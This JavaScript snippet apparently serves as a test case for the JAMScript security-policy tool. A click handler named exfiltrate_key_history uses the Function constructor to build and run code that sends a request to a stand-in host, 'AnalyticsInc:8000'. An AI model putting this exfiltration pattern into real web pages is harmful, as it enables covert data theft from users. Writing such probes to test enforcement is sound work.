function exfiltrate_key_history() {
  var v0 = JAMScript.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func_encodesel", true);xmlhttp.send(null);']);
  JAMScript.call(v0, null, []);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

